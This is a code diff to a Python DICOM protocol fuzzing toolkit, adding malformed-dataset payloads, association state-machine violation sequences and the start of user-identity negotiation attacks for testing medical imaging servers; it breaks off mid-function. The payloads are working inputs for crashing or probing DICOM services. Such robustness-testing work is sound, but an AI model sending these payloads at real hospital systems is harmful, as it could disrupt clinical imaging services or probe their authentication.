@@ -109,6 +109,7 @@ Example:
 
 from dataclasses import dataclass, field
 from typing import Any, Dict, Generator, List, Optional, Tuple, Union
+import base64
 import random
 import struct
 import os
@@ -124,6 +125,8 @@ try:
         DICOM, A_ASSOCIATE_RQ, A_ASSOCIATE_AC, A_ASSOCIATE_RJ,
         P_DATA_TF, A_RELEASE_RQ, A_RELEASE_RP, A_ABORT,
         C_ECHO_RQ, C_ECHO_RSP, C_STORE_RQ, C_FIND_RQ, C_MOVE_RQ,
+        N_CREATE_RQ, N_SET_RQ, N_ACTION_RQ, N_GET_RQ, N_DELETE_RQ,
+        N_EVENT_REPORT_RQ,
         PresentationDataValueItem, DICOMSocket,
         DICOMVariableItem, DICOMApplicationContext, DICOMUserInformation,
         DICOMPresentationContextRQ, DICOMAbstractSyntax, DICOMTransferSyntax,
@@ -133,6 +136,8 @@ try:
         CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
         MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
         MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+        MPPS_SOP_CLASS_UID, STORAGE_COMMITMENT_SOP_CLASS_UID,
+        STORAGE_COMMITMENT_SOP_INSTANCE_UID,
         _uid_to_bytes,
     )
     SCAPY_DICOM_AVAILABLE = True
@@ -162,12 +167,14 @@ __all__ = [
     # Attack pattern classes
     'ParserAttacks',
     'ProtocolAttacks',
+    'NegotiationAttacks',
     'MemoryAttacks',
     'LogicAttacks',
     'StorageSCPAbuseAttacks',
     'CommandInjectionAttacks',
     'PathTraversalAttacks',
     'StateMachineAttacks',
+    'DimseNAttacks',
     'CVEAttacks',
     # Seed generators (corpus emitters for AFL++/AFLNet; not fuzzing engines)
     'ProtocolSeedGenerator',
@@ -278,6 +285,13 @@ class ParserAttacks:
             payload=data,
             description='Undefined length without sequence delimiter',
             expected_behavior='Parser should timeout or reject',
+            metadata={
+                'coverage_scope': 'undefined-length-handling',
+                'bug_class': 'unterminated-undefined-length',
+                'target_field': '(7FE0,0010) Pixel Data',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -321,6 +335,12 @@ class ParserAttacks:
             payload=ds.encode(),
             description='Tags in descending order',
             expected_behavior='Parser should reject or sort',
+            metadata={
+                'coverage_scope': 'element-ordering',
+                'bug_class': 'descending-tag-order',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -351,6 +371,13 @@ class ParserAttacks:
             payload=ds.encode(),
             description='Null bytes in PatientName',
             expected_behavior='Parser may truncate or include nulls',
+            metadata={
+                'coverage_scope': 'string-value-sanitization',
+                'bug_class': 'embedded-null-truncation',
+                'target_field': '(0010,0010) Patient Name',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -438,6 +465,225 @@ class ParserAttacks:
         
         return results
 
+    # -------------------------------------------------------------------------
+    # Encoding-level confusion: the dataset disagrees with its declared syntax
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def sequence_depth_bomb(depth: int = 512) -> AttackResult:
+        """Sequences nested ``depth`` levels deep, all undefined-length.
+
+        Distinct from ``sequence_bomb``, which is wide rather than deep: a
+        recursive-descent parser recurses once per level here, so the cost is
+        stack rather than heap. Undefined lengths mean the depth is not
+        knowable until the parser has already descended.
+        """
+        item_tag = struct.pack('<HHI', 0xFFFE, 0xE000, 0xFFFFFFFF)
+        item_end = struct.pack('<HHI', 0xFFFE, 0xE00D, 0)
+        sq_open = struct.pack('<HH2sHI', 0x0040, 0xA730, b'SQ', 0, 0xFFFFFFFF)
+        sq_end = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)
+
+        payload = b''
+        for _ in range(depth):
+            payload = sq_open + item_tag + payload + item_end + sq_end
+        return AttackResult(
+            name='sequence_depth_bomb',
+            category='parser',
+            payload=payload,
+            description=f'Content Sequence nested {depth} levels deep, every '
+                        'level undefined-length',
+            expected_behavior='Parser should enforce a maximum nesting depth '
+                              'rather than recurse per level',
+            metadata={
+                'depth': depth,
+                'target_field': '(0040,A730) Content Sequence',
+                'bug_class': 'unbounded-recursion',
+                'coverage_scope': 'sequence-nesting-depth',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def explicit_vr_in_implicit_dataset() -> AttackResult:
+        """Explicit-VR elements inside a dataset declared Implicit VR.
+
+        Under Implicit VR the two bytes after the tag are the low half of a
+        32-bit length, so a VR of 'SH' reads as length 0x00004853 - about 18 KB
+        claimed from an element that carries 8.
+        """
+        payload = b''
+        payload += struct.pack('<HHI', 0x0008, 0x0016, 26) + \
+            SECONDARY_CAPTURE_SOP_CLASS_UID.encode('ascii')
+        payload += struct.pack('<HH2sH', 0x0010, 0x0010, b'SH', 8) + b'Doe^John'
+        payload += struct.pack('<HHI', 0x0010, 0x0020, 6) + b'ID0001'
+        return AttackResult(
+            name='explicit_vr_in_implicit_dataset',
+            category='parser',
+            payload=payload,
+            description='Implicit VR dataset containing one explicitly-typed '
+                        "element, whose VR bytes read as a ~18KB length",
+            expected_behavior='Parser must bound each element length by the '
+                              'remaining dataset rather than trusting it',
+            metadata={
+                'target_field': '(0010,0010) Patient Name',
+                'bug_class': 'transfer-syntax-confusion',
+                'coverage_scope': 'vr-encoding-confusion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def byte_swapped_lengths() -> AttackResult:
+        """Big-endian element headers inside a little-endian dataset.
+
+        A length of 8 written big-endian reads as 0x0800 (2048) little-endian,
+        so every element overruns; this reaches the same code as a genuine
+        endianness misdetection without needing the peer to negotiate
+        Explicit VR Big Endian.
+        """
+        payload = b''
+        payload += struct.pack('>HH2sH', 0x0800, 0x0500, b'UI', 26) + \
+            SECONDARY_CAPTURE_SOP_CLASS_UID.encode('ascii')
+        payload += struct.pack('>HH2sH', 0x1000, 0x1000, b'PN', 8) + b'Doe^John'
+        return AttackResult(
+            name='byte_swapped_lengths',
+            category='parser',
+            payload=payload,
+            description='Element headers encoded big-endian inside a dataset '
+                        'declared little-endian',
+            expected_behavior='Parser should fail on the resulting overruns '
+                              'rather than read past the buffer',
+            metadata={
+                'bug_class': 'endianness-confusion',
+                'coverage_scope': 'byte-order-confusion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def group_length_mismatch() -> AttackResult:
+        """A group length element that disagrees with the group it counts.
+
+        Group length elements are retired but still parsed. Code that trusts
+        one to size a group buffer, then copies the elements that actually
+        follow, has a mismatch to exploit in either direction.
+        """
+        group_body = struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 8) + b'Doe^John'
+        group_body += struct.pack('<HH2sH', 0x0010, 0x0020, b'LO', 6) + b'ID0001'
+        payload = struct.pack('<HH2sHI', 0x0010, 0x0000, b'UL', 4, 0xFFFFFF00)
+        payload += group_body
+        return AttackResult(
+            name='group_length_mismatch',
+            category='parser',
+            payload=payload,
+            description=f'(0010,0000) Group Length claims 0xFFFFFF00 bytes; the '
+                        f'group holds {len(group_body)}',
+            expected_behavior='Parser should ignore or re-derive group length, '
+                              'never size an allocation or copy from it',
+            metadata={
+                'target_field': '(0010,0000) Group Length',
+                'declared_length': 0xFFFFFF00,
+                'actual_length': len(group_body),
+                'bug_class': 'length-vs-content-mismatch',
+                'coverage_scope': 'group-length-handling',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def odd_length_values() -> AttackResult:
+        """Odd-length values, which PS3.5 7.1.1 forbids.
+
+        Every DICOM value is even-length; readers that assume it and step in
+        two-byte units lose tag alignment for the rest of the dataset, so each
+        subsequent element is read from the middle of the previous one.
+        """
+        payload = b''
+        payload += struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 7) + b'Doe^Joh'
+        payload += struct.pack('<HH2sH', 0x0010, 0x0020, b'LO', 5) + b'ID001'
+        payload += struct.pack('<HH2sH', 0x0008, 0x0060, b'CS', 3) + b'CTX'
+        return AttackResult(
+            name='odd_length_values',
+            category='parser',
+            payload=payload,
+            description='Three consecutive elements with odd value lengths '
+                        '(PS3.5 7.1.1 requires even padding)',
+            expected_behavior='Parser should reject odd lengths or realign '
+                              'without misreading the following elements',
+            metadata={
+                'bug_class': 'alignment-desync',
+                'coverage_scope': 'value-length-parity',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def sequence_delimiter_in_defined_length() -> AttackResult:
+        """Sequence Delimitation Item inside a defined-length sequence.
+
+        PS3.5 7.5 uses a delimiter only when the length is undefined. Here the
+        sequence declares its length *and* carries a delimiter, so a parser
+        that stops at whichever it sees first will disagree with one that
+        honors the other about where the sequence ends.
+        """
+        item_body = struct.pack('<HH2sH', 0x0008, 0x0060, b'CS', 2) + b'OT'
+        item = struct.pack('<HHI', 0xFFFE, 0xE000, len(item_body)) + item_body
+        delimiter = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)
+        trailing = struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 8) + b'Doe^John'
+        sq_body = item + delimiter + trailing
+        payload = struct.pack('<HH2sHI', 0x0040, 0xA730, b'SQ', 0, len(sq_body)) + sq_body
+        return AttackResult(
+            name='sequence_delimiter_in_defined_length',
+            category='parser',
+            payload=payload,
+            description='Defined-length sequence also carries a Sequence '
+                        'Delimitation Item, so its end is ambiguous',
+            expected_behavior='Parser should honor the defined length '
+                              'consistently and not resume outside the sequence',
+            metadata={
+                'target_field': '(0040,A730) Content Sequence',
+                'bug_class': 'sequence-boundary-ambiguity',
+                'coverage_scope': 'sequence-delimitation',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def private_creator_block_collision() -> AttackResult:
+        """Two private creators claiming the same reserved block.
+
+        PS3.5 7.8.1 gives each creator an exclusive block of 256 elements.
+        Two creators reserving 0x0010 means the elements in that block belong
+        to whichever the parser bound last, so a private element can be
+        attributed to the wrong vendor's handler.
+        """
+        payload = b''
+        payload += struct.pack('<HH2sH', 0x0009, 0x0010, b'LO', 8) + b'VENDOR_A'
+        payload += struct.pack('<HH2sH', 0x0009, 0x0010, b'LO', 8) + b'VENDOR_B'
+        payload += struct.pack('<HH2sH', 0x0009, 0x1001, b'OB', 4) + b'\xde\xad\xbe\xef'
+        return AttackResult(
+            name='private_creator_block_collision',
+            category='parser',
+            payload=payload,
+            description='Two private creators reserve block 0x0010 of group '
+                        '0x0009; one private element then follows',
+            expected_behavior='Parser should reject the duplicate reservation '
+                              'rather than silently rebind the block',
+            metadata={
+                'target_field': '(0009,0010) Private Creator',
+                'bug_class': 'private-block-rebinding',
+                'coverage_scope': 'private-creator-reservation',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
     @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every parser attack payload."""
@@ -452,6 +698,13 @@ class ParserAttacks:
         yield cls.format_string_injection()
         yield cls.path_traversal_in_string()
         yield cls.unicode_expansion()
+        yield cls.sequence_depth_bomb()
+        yield cls.explicit_vr_in_implicit_dataset()
+        yield cls.byte_swapped_lengths()
+        yield cls.group_length_mismatch()
+        yield cls.odd_length_values()
+        yield cls.sequence_delimiter_in_defined_length()
+        yield cls.private_creator_block_collision()
 
 
 # =============================================================================
@@ -514,6 +767,11 @@ class ProtocolAttacks:
             payload=payload,
             description='PDU declares 10 bytes, 1000 present',
             expected_behavior='Target should detect length mismatch',
+            metadata={
+                'coverage_scope': 'pdu-length-handling',
+                'bug_class': 'length-vs-content-mismatch',
+                'declared_length': 10, 'actual_length': 1000,
+            },
         )
 
     @staticmethod
@@ -544,6 +802,10 @@ class ProtocolAttacks:
             payload=payload,
             description='A-ASSOCIATE-RQ truncated mid-packet',
             expected_behavior='Target should handle incomplete PDU',
+            metadata={
+                'coverage_scope': 'pdu-truncation',
+                'bug_class': 'short-read',
+            },
         )
 
     @staticmethod
@@ -566,6 +828,10 @@ class ProtocolAttacks:
             payload=payload,
             description='P-DATA-TF without prior association',
             expected_behavior='Target should abort or ignore',
+            metadata={
+                'coverage_scope': 'association-state',
+                'bug_class': 'unassociated-data',
+            },
         )
 
     @staticmethod
@@ -606,6 +872,11 @@ class ProtocolAttacks:
             payload=payload,
             description='A-ASSOCIATE-RQ with AE title > 16 chars',
             expected_behavior='Target should reject overlong AE title',
+            metadata={
+                'coverage_scope': 'ae-title-handling',
+                'bug_class': 'fixed-field-overflow',
+                'target_field': 'Called AE Title',
+            },
         )
 
     @staticmethod
@@ -625,6 +896,11 @@ class ProtocolAttacks:
             payload=payload,
             description='A-ASSOCIATE-RQ with null AE titles',
             expected_behavior='Target should reject null AE titles',
+            metadata={
+                'coverage_scope': 'ae-title-handling',
+                'bug_class': 'empty-identity',
+                'target_field': 'Called/Calling AE Title',
+            },
         )
 
     @staticmethod
@@ -649,6 +925,10 @@ class ProtocolAttacks:
             payload=payload,
             description='A-ASSOCIATE-RQ without Application Context',
             expected_behavior='Target should reject missing context',
+            metadata={
+                'coverage_scope': 'association-variable-items',
+                'bug_class': 'missing-mandatory-item',
+            },
         )
 
     @staticmethod
@@ -753,6 +1033,10 @@ class ProtocolAttacks:
             payload=payload,
             description='A-ABORT packet for mid-session injection',
             expected_behavior='Target should handle abort cleanly',
+            metadata={
+                'coverage_scope': 'association-teardown',
+                'bug_class': 'unsolicited-abort',
+            },
         )
 
     @staticmethod
@@ -1072,6 +1356,12 @@ class LogicAttacks:
             payload=file_data,
             description='Meta says Explicit VR, data is Implicit VR',
             expected_behavior='Parser should detect encoding mismatch',
+            metadata={
+                'coverage_scope': 'negotiated-syntax-enforcement',
+                'bug_class': 'syntax-vs-encoding-mismatch',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -1088,6 +1378,12 @@ class LogicAttacks:
             payload=ds.encode(),
             description='Claims CT Image but missing CT elements',
             expected_behavior='Validator should reject',
+            metadata={
+                'coverage_scope': 'sop-class-enforcement',
+                'bug_class': 'sop-class-confusion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -1103,6 +1399,12 @@ class LogicAttacks:
             payload=ds.encode(),
             description='Private tag (0009,1001) without (0009,0010) creator',
             expected_behavior='Parser may misinterpret VR',
+            metadata={
+                'coverage_scope': 'private-creator-reservation',
+                'bug_class': 'unreserved-private-element',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -2017,6 +2319,10 @@ class StateMachineAttacks:
             payload=pdu_bytes,
             description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
             expected_behavior='Target should abort or ignore',
+            metadata={
+                'state': 'Sta1', 'reference': 'PS3.8 Table 9-10',
+                'bug_class': 'unassociated-data',
+            },
         )
 
     @staticmethod
@@ -2033,6 +2339,10 @@ class StateMachineAttacks:
             payload=pdu_bytes,
             description='A-RELEASE-RQ in Sta1',
             expected_behavior='Target should abort',
+            metadata={
+                'state': 'Sta1', 'reference': 'PS3.8 Table 9-10',
+                'bug_class': 'unassociated-release',
+            },
         )
 
     @staticmethod
@@ -2104,6 +2414,240 @@ class StateMachineAttacks:
             metadata={'steps': steps},
         )
 
+    # -------------------------------------------------------------------------
+    # Post-teardown transitions: bytes that arrive after the association is over
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def _assoc_pdu() -> bytes:
+        return _associate_rq_bytes(
+            'STORESCP', 'C-SCARE-FZ', VERIFICATION_SOP_CLASS_UID)
+
+    @staticmethod
+    def _echo_pdata(message_id: int = 1, context_id: int = 1,
+                    is_last: int = 1, is_command: int = 1) -> bytes:
+        if not SCAPY_AVAILABLE:
+            return b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
+        pdv = PresentationDataValueItem(
+            context_id=context_id, is_last=is_last, is_command=is_command,
+            data=raw(C_ECHO_RQ(message_id=message_id)),
+        )
+        return raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+
+    @staticmethod
+    def _abort_pdu(source: int = 0, reason: int = 0) -> bytes:
+        if not SCAPY_AVAILABLE:
+            return b'\x07\x00' + struct.pack('!I', 4) + bytes([0, 0, source, reason])
+        return raw(DICOM() / A_ABORT(source=source, reason_diag=reason))
+
+    @classmethod
+    def abort_then_pdata(cls) -> AttackResult:
+        """Keep sending after A-ABORT.
+
+        A-ABORT returns both sides to Sta1 immediately (PS3.8 9.2.3), so the
+        P-DATA-TF that follows belongs to no association. A target that keeps
+        the connection's parsing context alive after abort processes it
+        anyway.
+        """
+        steps = [cls._assoc_pdu(), cls._abort_pdu(), cls._echo_pdata()]
+        return AttackResult(
+            name='sm_abort_then_pdata',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='P-DATA-TF sent after the requestor issues A-ABORT',
+            expected_behavior='Target must discard the connection at A-ABORT and '
+                              'process nothing that follows',
+            metadata={'steps': steps, 'state': 'Sta1 after abort',
+                      'reference': 'PS3.8 9.2.3',
+                      'bug_class': 'post-abort-processing'},
+        )
+
+    @classmethod
+    def pdata_after_release_rp(cls) -> AttackResult:
+        """Data after release is complete."""
+        steps = [cls._assoc_pdu(), _release_rq_bytes(), cls._echo_pdata(message_id=2)]
+        return AttackResult(
+            name='sm_pdata_after_release_rp',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='P-DATA-TF after A-RELEASE-RQ, i.e. once release is under way',
+            expected_behavior='Target should abort rather than service data during '
+                              'or after release (Sta7/Sta13)',
+            metadata={'steps': steps, 'state': 'Sta7',
+                      'reference': 'PS3.8 Table 9-10',
+                      'bug_class': 'post-release-processing'},
+        )
+
+    @classmethod
+    def release_collision(cls) -> AttackResult:
+        """Two A-RELEASE-RQs, the collision case of PS3.8 9.3.7.
+
+        Release collision is a real but rarely exercised branch: both sides
+        request release at once and the requestor must wait for A-RELEASE-RP
+        while the acceptor's own A-RELEASE-RQ is in flight.
+        """
+        steps = [cls._assoc_pdu(), _release_rq_bytes(), _release_rq_bytes()]
+        return AttackResult(
+            name='sm_release_collision',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='Second A-RELEASE-RQ while the first is unanswered',
+            expected_behavior='Target should follow the release-collision rules '
+                              'or abort, not double-free the association',
+            metadata={'steps': steps, 'state': 'Sta7',
+                      'reference': 'PS3.8 9.3.7',
+                      'bug_class': 'release-collision'},
+        )
+
+    # -------------------------------------------------------------------------
+    # Role reversal: acceptor PDUs sent by the requestor
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def associate_ac_from_requestor(cls) -> AttackResult:
+        """The requestor sends A-ASSOCIATE-AC, which only an acceptor may send.
+
+        An SCP that shares one PDU dispatch table between both roles will
+        parse an AC it can never legitimately receive.
+        """
+        if not SCAPY_AVAILABLE:
+            ac_pdu = b'\x02\x00' + struct.pack('!I', 68) + b'\x00' * 68
+        else:
+            ac_pdu = raw(DICOM() / A_ASSOCIATE_AC(
+                called_ae_title='STORESCP', calling_ae_title='C-SCARE-FZ'))
+        steps = [ac_pdu]
+        return AttackResult(
+            name='sm_associate_ac_from_requestor',
+            category='state_machine',
+            payload=ac_pdu,
+            description='A-ASSOCIATE-AC sent by the association requestor in Sta1',
+            expected_behavior='An acceptor must reject a PDU only it is allowed '
+                              'to send',
+            metadata={'steps': steps, 'state': 'Sta1',
+                      'reference': 'PS3.8 Table 9-10',
+                      'bug_class': 'role-confusion'},
+        )
+
+    @classmethod
+    def release_rp_from_requestor(cls) -> AttackResult:
+        """A-RELEASE-RP sent by the requestor, which only an acceptor may send."""
+        if not SCAPY_AVAILABLE:
+            rp_pdu = b'\x06\x00' + struct.pack('!I', 4) + b'\x00' * 4
+        else:
+            rp_pdu = raw(DICOM() / A_RELEASE_RP())
+        steps = [cls._assoc_pdu(), rp_pdu]
+        return AttackResult(
+            name='sm_release_rp_from_requestor',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='A-RELEASE-RP sent by the requestor in Sta6',
+            expected_behavior='Target should abort on a response PDU it never '
+                              'requested',
+            metadata={'steps': steps, 'state': 'Sta6',
+                      'reference': 'PS3.8 Table 9-10',
+                      'bug_class': 'role-confusion'},
+        )
+
+    # -------------------------------------------------------------------------
+    # PDV-level framing inside an otherwise valid association
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def data_pdv_before_command_pdv(cls) -> AttackResult:
+        """A data-set PDV with no command PDV ahead of it.
+
+        PS3.7 6.3.1: every DIMSE message is a command set optionally followed
+        by a data set. A data PDV that arrives first has no command context to
+        be interpreted against.
+        """
+        if not SCAPY_AVAILABLE:
+            pdata = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
+        else:
+            ds = _injection_base_dataset()
+            pdv = PresentationDataValueItem(
+                context_id=1, is_last=1, is_command=0, data=ds.encode())
+            pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+        steps = [cls._assoc_pdu(), pdata]
+        return AttackResult(
+            name='sm_data_pdv_before_command_pdv',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='Data-set PDV arrives with no preceding command-set PDV',
+            expected_behavior='Target must require a command set before a data '
+                              'set (PS3.7 6.3.1)',
+            metadata={'steps': steps, 'reference': 'PS3.7 6.3.1',
+                      'bug_class': 'dimse-message-ordering'},
+        )
+
+    @classmethod
+    def unterminated_command_fragment(cls) -> AttackResult:
+        """Command PDVs that never set the last-fragment flag.
+
+        Each fragment says more is coming, so a target that buffers until the
+        last flag arrives accumulates without bound on a single association.
+        """
+        if not SCAPY_AVAILABLE:
+            pdata = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
+            steps = [cls._assoc_pdu(), pdata, pdata, pdata]
+        else:
+            fragments = []
+            for _ in range(8):
+                pdv = PresentationDataValueItem(
+                    context_id=1, is_last=0, is_command=1,
+                    data=raw(C_ECHO_RQ(message_id=1))[:16])
+                fragments.append(raw(DICOM() / P_DATA_TF(pdv_items=[pdv])))
+            steps = [cls._assoc_pdu()] + fragments
+        return AttackResult(
+            name='sm_unterminated_command_fragment',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='Eight command PDVs, none marked last, then silence',
+            expected_behavior='Target should bound reassembly buffers and time '
+                              'out an unterminated DIMSE message',
+            metadata={'steps': steps, 'fragment_count': 8,
+                      'reference': 'PS3.8 9.3.5',
+                      'bug_class': 'unbounded-reassembly'},
+        )
+
+    @classmethod
+    def interleaved_context_ids(cls) -> AttackResult:
+        """One message's fragments interleaved with another context's.
+
+        PS3.8 9.3.5 forbids interleaving PDVs of different presentation
+        contexts inside a message. A target keying reassembly on the
+        connection rather than the context ID will splice them together.
+        """
+        if not SCAPY_AVAILABLE:
+            pdata = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
+            steps = [cls._assoc_pdu(), pdata, pdata]
+        else:
+            first = PresentationDataValueItem(
+                context_id=1, is_last=0, is_command=1,
+                data=raw(C_ECHO_RQ(message_id=1))[:12])
+            other = PresentationDataValueItem(
+                context_id=3, is_last=0, is_command=1,
+                data=raw(C_ECHO_RQ(message_id=2))[:12])
+            tail = PresentationDataValueItem(
+                context_id=1, is_last=1, is_command=1,
+                data=raw(C_ECHO_RQ(message_id=1))[12:])
+            steps = [
+                cls._assoc_pdu(),
+                raw(DICOM() / P_DATA_TF(pdv_items=[first])),
+                raw(DICOM() / P_DATA_TF(pdv_items=[other])),
+                raw(DICOM() / P_DATA_TF(pdv_items=[tail])),
+            ]
+        return AttackResult(
+            name='sm_interleaved_context_ids',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='PDVs for presentation context 3 interleave the fragments '
+                        'of a message on context 1',
+            expected_behavior='Reassembly must be per presentation context; '
+                              'interleaving should abort (PS3.8 9.3.5)',
+            metadata={'steps': steps, 'reference': 'PS3.8 9.3.5',
+                      'bug_class': 'cross-context-reassembly'},
+        )
+
     @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every state machine attack payload."""
@@ -2112,6 +2656,14 @@ class StateMachineAttacks:
         yield cls.double_association()
         yield cls.release_then_pdata()
         yield cls.incomplete_fragment()
+        yield cls.abort_then_pdata()
+        yield cls.pdata_after_release_rp()
+        yield cls.release_collision()
+        yield cls.associate_ac_from_requestor()
+        yield cls.release_rp_from_requestor()
+        yield cls.data_pdv_before_command_pdv()
+        yield cls.unterminated_command_fragment()
+        yield cls.interleaved_context_ids()
 
 
 # =============================================================================
@@ -2266,6 +2818,900 @@ def _icsma_metadata(cve: str,
         'greybox_driver': greybox_driver,
         'target': target,
     }
+
+
+# =============================================================================
+# Negotiation Attacks - A-ASSOCIATE user-information sub-item abuse (PS3.7 D.3)
+# =============================================================================
+
+# User Information sub-item types, PS3.7 Annex D.3.3.
+_ITEM_MAX_LENGTH = 0x51
+_ITEM_IMPLEMENTATION_CLASS_UID = 0x52
+_ITEM_ASYNC_OPERATIONS_WINDOW = 0x53
+_ITEM_ROLE_SELECTION = 0x54
+_ITEM_IMPLEMENTATION_VERSION = 0x55
+_ITEM_SOP_EXTENDED_NEGOTIATION = 0x56
+_ITEM_SOP_COMMON_EXTENDED_NEGOTIATION = 0x57
+_ITEM_USER_IDENTITY_RQ = 0x58
+
+# User Identity types, PS3.7 D.3.3.7.1. Types 3-5 hand attacker-controlled
+# bytes to a ticket, XML, or JWT parser respectively - parsers that sit in
+# front of authentication and are rarely reached by conformance testing.
+USER_IDENTITY_USERNAME = 1
+USER_IDENTITY_USERNAME_PASSCODE = 2
+USER_IDENTITY_KERBEROS = 3
+USER_IDENTITY_SAML = 4
+USER_IDENTITY_JWT = 5
+
+
+def _user_identity_bytes(identity_type: int,
+                         primary: bytes,
+                         secondary: bytes = b'',
+                         positive_response: int = 1,
+                         declared_primary_len: Optional[int] = None,
+                         declared_secondary_len: Optional[int] = None) -> bytes:
+    """Build a User Identity Negotiation sub-item (PS3.7 D.3.3.7).
+
+    ``declared_*_len`` override the length prefixes without changing the bytes
+    that follow, which is how a length-versus-content disagreement is
+    expressed on the wire.
+    """
+    primary_len = len(primary) if declared_primary_len is None else declared_primary_len
+    secondary_len = len(secondary) if declared_secondary_len is None else declared_secondary_len
+    body = struct.pack('!BB', identity_type & 0xFF, positive_response & 0xFF)
+    body += struct.pack('!H', primary_len & 0xFFFF) + primary
+    body += struct.pack('!H', secondary_len & 0xFFFF) + secondary
+    return _item_bytes(_ITEM_USER_IDENTITY_RQ, body)
+
+
+def _baseline_user_info(extra: bytes) -> bytes:
+    """User Information carrying the mandatory items plus ``extra``.
+
+    Keeping Maximum Length and Implementation Class UID valid isolates the
+    sub-item under test: a rejection then means the target rejected *that*
+    item, not an otherwise unusable association request.
+    """
+    payload = _item_bytes(_ITEM_MAX_LENGTH, struct.pack('!I', 16384))
+    payload += _item_bytes(_ITEM_IMPLEMENTATION_CLASS_UID,
+                           IMPLEMENTATION_CLASS_UID.encode('ascii'))
+    return payload + extra
+
+
+def _negotiation_rq(extra_user_info: bytes,
+                    abstract_syntax: str = CT_IMAGE_STORAGE_SOP_CLASS_UID) -> bytes:
+    return _associate_rq_bytes(
+        'STORESCP', 'C-SCARE-FZ', abstract_syntax,
+        user_info_payload=_baseline_user_info(extra_user_info))
+
+
+def _negotiation_metadata(scope: str, item_type: int, **extra) -> Dict[str, Any]:
+    metadata = {
+        'coverage_scope': scope,
+        'user_information_item_type': f'0x{item_type:02X}',
+        'target_role': 'scp-server',
+        'delivery': 'raw-pdu',
+        'reference': 'PS3.7 Annex D.3.3',
+    }
+    metadata.update(extra)
+    return metadata
+
+
+class NegotiationAttacks:
+    """
+    A-ASSOCIATE User Information sub-item abuse (PS3.7 Annex D.3.3).
+
+    Association negotiation is parsed *before* any DIMSE service runs and
+    before most access control, so a defect here is reachable by an
+    unauthenticated peer that never completes an association. User Identity
+    Negotiation is the notable one: many deployments treat it as the
+    authentication boundary, and types 3-5 hand attacker-controlled bytes to
+    a Kerberos, XML, or JWT parser.
+
+    Every payload is a single complete A-ASSOCIATE-RQ; deliver with
+    ``deliver.send_pdu``. The mandatory user-information items stay valid so a
+    rejection is attributable to the sub-item under test.
+    """
+
+    # -------------------------------------------------------------------------
+    # User Identity Negotiation (0x58) - the authentication surface
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def user_identity_empty_credentials() -> AttackResult:
+        """Username+passcode identity with both fields empty."""
+        payload = _negotiation_rq(_user_identity_bytes(
+            USER_IDENTITY_USERNAME_PASSCODE, b'', b''))
+        return AttackResult(
+            name='negotiation_user_identity_empty_credentials',
+            category='negotiation',
+            payload=payload,
+            description='User Identity type 2 (username+passcode) with both fields empty',
+            expected_behavior='Target must not treat empty credentials as an '
+                              'authenticated identity',
+            metadata=_negotiation_metadata(
+                'user-identity-authentication', _ITEM_USER_IDENTITY_RQ,
